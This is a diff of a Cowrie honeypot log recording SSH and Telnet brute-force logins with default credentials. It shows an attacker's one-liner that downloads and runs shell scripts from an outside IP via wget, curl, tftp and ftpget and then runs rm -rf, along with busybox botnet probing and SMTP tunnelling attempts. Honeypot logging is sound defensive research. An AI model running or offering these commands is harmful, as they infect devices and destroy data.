@@ -560,3 +560,124 @@
 2017-06-01T17:41:01+0000 [CowrieTelnetTransport,4847,109.236.83.181] Warning: state changed and new state returned
 2017-06-01T17:41:01+0000 [CowrieTelnetTransport,4847,109.236.83.181] login attempt: 586
 2017-06-01T17:41:01+0000 [CowrieTelnetTransport,4847,109.236.83.181] login return, expect: [default/]
+2017-06-01T17:41:02+0000 [CowrieTelnetTransport,4847,109.236.83.181] login attempt [shell/sh] failed
+2017-06-01T17:41:02+0000 [CowrieTelnetTransport,4847,109.236.83.181] Warning: state changed and new state returned
+2017-06-01T17:41:03+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 163.172.138.239:33716 (10.8.41.81:2222) [session: 320e41d8]
+2017-06-01T17:41:03+0000 [HoneyPotSSHTransport,1319,163.172.138.239] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-06-01T17:41:03+0000 [HoneyPotSSHTransport,1319,163.172.138.239] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-01T17:41:03+0000 [HoneyPotSSHTransport,1319,163.172.138.239] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-01T17:41:03+0000 [HoneyPotSSHTransport,1319,163.172.138.239] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-01T17:41:03+0000 [HoneyPotSSHTransport,1319,163.172.138.239] NEW KEYS
+2017-06-01T17:41:03+0000 [HoneyPotSSHTransport,1319,163.172.138.239] starting service 'ssh-userauth'
+2017-06-01T17:41:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1319,163.172.138.239] 'admin' trying auth 'password'
+2017-06-01T17:41:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1319,163.172.138.239] login attempt: 23
+2017-06-01T17:41:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1319,163.172.138.239] login return, expect: [admin/admin]
+2017-06-01T17:41:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1319,163.172.138.239] login attempt [admin/admin] succeeded
+2017-06-01T17:41:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1319,163.172.138.239] 'admin' authenticated with 'password'
+2017-06-01T17:41:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,1319,163.172.138.239] starting service 'ssh-connection'
+2017-06-01T17:41:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-01T17:41:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] direct-tcp connection request to 207.46.8.167:25 from localhost:5556
+2017-06-01T17:41:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1319,163.172.138.239] got channel 'session' request
+2017-06-01T17:41:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1319,163.172.138.239] channel open
+2017-06-01T17:41:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1319,163.172.138.239] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.48.238/armex.sh; curl -O http://51.15.48.238/armex.sh; chmod 777 armex.sh; sh armex.sh; tftp 51.15.48.238 -c get armexft.sh; chmod 777 armexft.sh; sh armexft.sh; tftp 51.15.48.238 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.48.238; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+	"
+2017-06-01T17:41:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1319,163.172.138.239] Opening TTY Log: log/tty/20170601-174107-320e41d8-0e.log
+2017-06-01T17:41:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1319,163.172.138.239] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.15.48.238/armex.sh; curl -O http://51.15.48.238/armex.sh; chmod 777 armex.sh; sh armex.sh; tftp 51.15.48.238 -c get armexft.sh; chmod 777 armexft.sh; sh armexft.sh; tftp 51.15.48.238 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.15.48.238; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+	
+2017-06-01T17:41:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1319,163.172.138.239] Command found: cd /tmp
+2017-06-01T17:41:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1319,163.172.138.239] Command found: cd /var/run
+2017-06-01T17:41:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1319,163.172.138.239] Command found: cd /mnt
+2017-06-01T17:41:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1319,163.172.138.239] Command found: cd /root
+2017-06-01T17:41:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1319,163.172.138.239] Command found: cd /
+2017-06-01T17:41:07+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1319,163.172.138.239] Command found: wget http://51.15.48.238/armex.sh
+2017-06-01T17:41:07+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: curl -O http://51.15.48.238/armex.sh
+2017-06-01T17:41:07+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-01T17:41:07+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: chmod 777 armex.sh
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: sh armex.sh
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.48.238 -c get armexft.sh
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: chmod 777 armexft.sh
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: sh armexft.sh
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: tftp 51.15.48.238 -c get tftp1.sh
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 51.15.48.238
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 51.15.48.238 ftp1.sh ftp1.sh
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] FTP retrieval failed: 425 Security: Bad IP connecting.
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: rm -rf armex.sh tftp1.sh tftp2.sh ftp1.sh
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170601-174107-320e41d8-0e.log after 0 seconds
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-01T17:41:07+0000 [HTTPPageDownloader,client] sending close 0
+2017-06-01T17:41:07+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-01T17:41:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-01T17:41:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] direct-tcp connection request to 65.55.33.135:25 from localhost:5556
+2017-06-01T17:41:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-01T17:41:15+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] direct-tcp connection request to 65.54.188.126:25 from localhost:5556
+2017-06-01T17:41:17+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,1319,163.172.138.239] remote close
+2017-06-01T17:41:17+0000 [HoneyPotSSHTransport,1319,163.172.138.239] avatar admin logging out
+2017-06-01T17:41:17+0000 [HoneyPotSSHTransport,1319,163.172.138.239] connection lost
+2017-06-01T17:41:17+0000 [HoneyPotSSHTransport,1319,163.172.138.239] Connection lost after 14 seconds
+2017-06-01T17:41:19+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-01T17:41:19+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] direct-tcp connection request to 65.55.92.184:25 from localhost:5556
+2017-06-01T17:41:32+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 109.236.83.181:36731 (10.8.41.81:2223) [session: TT4848]
+2017-06-01T17:41:37+0000 [CowrieTelnetTransport,4848,109.236.83.181] login attempt: 587
+2017-06-01T17:41:37+0000 [CowrieTelnetTransport,4848,109.236.83.181] login return, expect: [default/]
+2017-06-01T17:41:39+0000 [CowrieTelnetTransport,4848,109.236.83.181] login attempt [root/xc3511] failed
+2017-06-01T17:41:39+0000 [CowrieTelnetTransport,4848,109.236.83.181] Warning: state changed and new state returned
+2017-06-01T17:41:39+0000 [CowrieTelnetTransport,4848,109.236.83.181] login attempt: 588
+2017-06-01T17:41:39+0000 [CowrieTelnetTransport,4848,109.236.83.181] login return, expect: [default/]
+2017-06-01T17:41:41+0000 [CowrieTelnetTransport,4848,109.236.83.181] login attempt [enable/system] failed
+2017-06-01T17:41:41+0000 [CowrieTelnetTransport,4848,109.236.83.181] Warning: state changed and new state returned
+2017-06-01T17:41:41+0000 [CowrieTelnetTransport,4848,109.236.83.181] login attempt: 589
+2017-06-01T17:41:41+0000 [CowrieTelnetTransport,4848,109.236.83.181] login return, expect: [default/]
+2017-06-01T17:41:43+0000 [CowrieTelnetTransport,4848,109.236.83.181] login attempt [shell/sh] failed
+2017-06-01T17:41:43+0000 [CowrieTelnetTransport,4848,109.236.83.181] Warning: state changed and new state returned
+2017-06-01T17:41:44+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-01T17:41:44+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] direct-tcp connection request to 80.179.55.150:25 from localhost:5556
+2017-06-01T17:41:45+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 201.2.220.230:4030 (10.8.41.81:2223) [session: TT4849]
+2017-06-01T17:41:46+0000 [CowrieTelnetTransport,4849,201.2.220.230] first time for 201.2.220.230, need: 1
+2017-06-01T17:41:46+0000 [CowrieTelnetTransport,4849,201.2.220.230] login attempt: 1
+2017-06-01T17:41:48+0000 [CowrieTelnetTransport,4849,201.2.220.230] login attempt [root/Zte521] succeeded
+2017-06-01T17:41:50+0000 [CowrieTelnetTransport,4849,201.2.220.230] Opening TTY Log: log/tty/20170601-174150-None-4849i.log
+2017-06-01T17:41:50+0000 [CowrieTelnetTransport,4849,201.2.220.230] Warning: state changed and new state returned
+2017-06-01T17:41:51+0000 [CowrieTelnetTransport,4849,201.2.220.230] CMD: enable
+2017-06-01T17:41:51+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: enable 
+2017-06-01T17:41:51+0000 [CowrieTelnetTransport,4849,201.2.220.230] Reading txtcmd from "txtcmds/bin/enable"
+2017-06-01T17:41:51+0000 [CowrieTelnetTransport,4849,201.2.220.230] CMD: system
+2017-06-01T17:41:51+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command not found: system
+2017-06-01T17:41:51+0000 [CowrieTelnetTransport,4849,201.2.220.230] CMD: shell
+2017-06-01T17:41:51+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command not found: shell
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] CMD: sh
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: sh 
+2017-06-01T17:41:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-01T17:41:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] direct-tcp connection request to 104.44.194.236:25 from localhost:5556
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] CMD:  /bin/busybox wget; /bin/busybox 81c46036wget; /bin/busybox echo -ne '\x0181c46036\x7f'; /bin/busybox printf '\00281c46036\177'; /bin/echo -ne '\x0381c46036\x7f'; /usr/bin/printf '\00481c46036\177'; /bin/busybox tftp; /bin/busybox 81c46036tftp;
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: /bin/busybox wget
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: wget
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: /bin/busybox 81c46036wget
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: /bin/busybox echo -ne '\x0181c46036\x7f'
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: echo -ne '\x0181c46036\x7f'
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: /bin/busybox printf '\00281c46036\177'
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: /bin/echo -ne '\x0381c46036\x7f'
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command not found: /usr/bin/printf '\00481c46036\177'
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: /bin/busybox tftp
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: tftp
+2017-06-01T17:41:52+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: /bin/busybox 81c46036tftp
+2017-06-01T17:41:53+0000 [CowrieTelnetTransport,4849,201.2.220.230] CMD:  /bin/busybox dd if=/bin/busybox bs=22 count=1 || /bin/busybox cat /bin/busybox
+2017-06-01T17:41:53+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: /bin/busybox dd if=/bin/busybox bs=22 count=1
+2017-06-01T17:41:53+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: /bin/busybox cat /bin/busybox
+2017-06-01T17:41:53+0000 [CowrieTelnetTransport,4849,201.2.220.230] Command found: cat /bin/busybox
+2017-06-01T17:41:53+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 120.63.237.55:34217 (10.8.41.81:2223) [session: TT4850]
+2017-06-01T17:41:55+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-01T17:41:55+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] direct-tcp connection request to 89.161.132.31:25 from localhost:5556
+2017-06-01T17:41:55+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 116.207.226.89:49839 (10.8.41.81:2223) [session: TT4851]
+2017-06-01T17:42:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] got channel 'direct-tcpip' request
+2017-06-01T17:42:00+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,1307,91.195.103.183] direct-tcp connection request to 74.125.28.27:25 from localhost:5556
